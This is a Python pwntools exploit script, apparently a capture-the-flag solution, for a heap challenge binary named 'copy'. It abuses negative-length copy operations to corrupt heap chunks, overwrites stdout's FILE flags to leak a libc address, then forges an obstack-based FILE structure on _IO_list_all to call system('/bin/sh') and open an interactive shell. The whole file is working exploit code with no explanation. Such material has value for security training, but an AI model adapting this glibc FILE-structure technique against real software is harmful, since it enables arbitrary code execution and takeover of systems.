from pwn import *

context(arch='amd64', os='linux', log_level='debug')


binary = './copy'
elf = ELF(binary)
libc = ELF('./libc.so.6')  
#p = remote('127.0.0.1', 1337)
p = process(binary)


def add(size,cont="A"):
	p.sendlineafter("> ",b"0")
	p.sendlineafter("size: ",str(size))
	p.sendline(cont)
def addnew(size,cont="A"):
	p.sendlineafter("> ",b"0")
	p.sendlineafter("size: ",size)

def copy(dst,src,len):
	p.sendlineafter("> ",b"1")
	p.sendlineafter("dst: ",str(dst))
	p.sendlineafter("src: ",str(src))
	p.sendlineafter("len: ",str(len))
def exxxit():
	p.sendlineafter("> ",b"2")
banner = p.recv(timeout=2) 
print("BANNER:", repr(banner))
add(0x100,b"f"*0x50+b"g"*0x48+p64(0x291))
add(0x100,(b"a"*0x78+p64(0x46a0)).ljust(0x100,b"a"))#_IO_list_all
add(0x100,(b"b"*0x78+p64(0x47a0)).ljust(0x100,b"b"))#_IO_2_1_stdout_ 
add(0x100,b"c"*0x80+b"l"*0x80)
add(0x100,(b"d"*0x68+p64(0x7b1)).ljust(0x100,b"d"))
add(0x60,b"e"*0x60)
#rdi-rsi<size
copy(0,4,-0x1e0)
copy(5,4,-0x10)

addnew("0"*0x800+"10000")
copy(3,5,-8)
copy(3,2,0x7a)
copy(2,3,-0x100)
copy(0,4,-0x180)
add(0xe0,p64(0xfbad1880)+p64(0)*3)

#add(0x20,b"aaaaaaa")
#add(0x100,b"aaaaaaa")
#add(0x100,b"aaaaaaa")



p.recvuntil("\xff\x7f")
p.recv(4)
leak=u64(p.recv(6)+b"\x00\x00")-0x192d70
libc.address=leak
print(f"leak:{hex(leak)}")
copy(2,1,0x7a)
copy(0,4,-0x180)

magic_heap = libc.sym["_IO_list_all"] - 0x18
ch_1_addr = magic_heap + 0x90 + 0x30 + 1
binshaddr = next(libc.search("/bin/sh"))
heapofobstack = magic_heap + 0x40 - 0x30
heap_next = magic_heap + 0x90
obstack_io = leak + 0x1D2AF8 - 0x18
payload = flat({
    0x20: p64(0),
    0x28: p64(ch_1_addr) * 2,  # 

    0x40: flat({

        8: p64(libc.sym["system"]),
        0x18: p64(binshaddr),
        0x20: p64(1)
    }, length=0x30, filler=b"\x00"),
    0x88: p64(magic_heap),  # 
    0x90: flat({
        0: p64(0),
        8: p64(0),
        0x10: p64(ch_1_addr),
        0x20: p64(11),
        0x28: p64(heapofobstack),  # 

    }, length=0x40, filler=b"\x00"),

    0xd8: p64(obstack_io),
    0xe0: p64(heap_next),
    #0xe8:p64(0xdeadbeefaa)

}, length=0xf0, filler=b"\x00")
add(0xe0,p64(magic_heap)+payload[0x20:])
#gdb.attach(p)
#pause()
p.interactive()






